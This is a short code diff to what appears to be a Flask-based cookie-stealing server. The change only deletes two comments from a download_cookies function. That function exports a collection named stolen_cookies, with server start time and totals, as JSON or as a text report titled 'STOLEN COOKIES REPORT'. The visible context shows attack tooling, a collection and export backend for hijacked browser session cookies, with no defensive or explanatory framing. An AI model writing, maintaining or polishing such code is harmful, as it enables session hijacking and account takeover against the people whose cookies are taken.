@@ -90,7 +90,6 @@ def download_cookies(format):
     from flask import Response
     
     if format == 'json':
-        # Export as JSON
         json_data = json.dumps({
             'server_start': SERVER_START_TIME,
             'total_cookies': len(stolen_cookies),
@@ -106,7 +105,6 @@ def download_cookies(format):
         )
     
     elif format == 'txt':
-        # Export as TXT
         txt_lines = []
         txt_lines.append("="*70)
         txt_lines.append("STOLEN COOKIES REPORT")
